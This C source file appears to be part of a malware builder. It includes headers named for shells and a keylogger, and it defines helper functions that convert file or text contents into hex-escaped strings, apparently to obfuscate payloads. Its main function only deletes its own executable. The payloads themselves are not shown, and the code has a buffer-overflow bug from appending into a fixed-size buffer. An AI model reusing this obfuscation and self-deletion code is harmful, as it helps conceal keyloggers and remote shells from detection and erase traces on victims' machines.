#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include "Shells.h"
#include "code_KeyLog.h"

void Obfs_file(char* path);
void Obfs_Text(char* text);


int main(int arg, char** argv) {


  remove(argv[0]);
  return 0;
}



char code[7000];
char code_final_addr;
char *code_final = &code_final_addr;

void Obfs_file(char* path) {

  code_final = calloc( ( sizeof(code) ), sizeof(char));

  FILE* file = fopen(path, "r");
  while(fgets(code, 7000, file)) {
    strcat(code_final, code);
  }

  for (size_t num = 0; num < (strlen(code_final)); num++) {
    if (code_final[num] != '%') {
        printf("\\x%x", code_final[num]);
    }
    else {
        printf("%%");
    }
  };

}



void Obfs_Text(char* text) {
  for (size_t num = 0; num < (strlen(text)); num++) {
    if (text[num] != '%') {
        printf("\\x%x", text[num]);
    }
    else {
        printf("%%");
    }
  };

}
